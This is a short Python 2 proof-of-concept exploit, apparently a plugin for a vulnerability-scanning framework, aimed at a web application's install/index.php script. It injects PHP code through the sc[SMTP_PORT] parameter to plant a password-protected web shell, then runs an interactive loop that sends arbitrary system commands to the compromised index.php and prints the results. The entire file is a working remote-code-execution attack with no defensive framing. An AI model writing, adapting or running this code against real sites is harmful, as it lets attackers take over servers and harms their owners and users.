import re
import urlparse

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("install/index.php"):
            print("[*] Please make sure the url end with 'install/index.php'")
            exit()
        password = raw_input("[*] Please enter the shell-password:")
        url1 = target.url + "?sc[SMTP_PORT]=25\\\\');echo `$_POST[%s]`;//" % password
        r = requests.get(url1)
        shell = target.url.replace("install/index.php", "index.php")
        print("[*] The shell url: " + shell)
        print("[*] The shell password: " + password)

        while 1:
            try:
                command = raw_input("[*] input the command:")
                if command != "exit":
                    postData = {password: command}
                    r = requests.post(shell, data=postData)
                    print(r.text.encode(
                        r.encoding)[:r.text.find("<!DOCTYPE HTML>")])
                else:
                    break
            except EOFError as e:
                print("[*] type 'exit' to quit")
                pass

    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
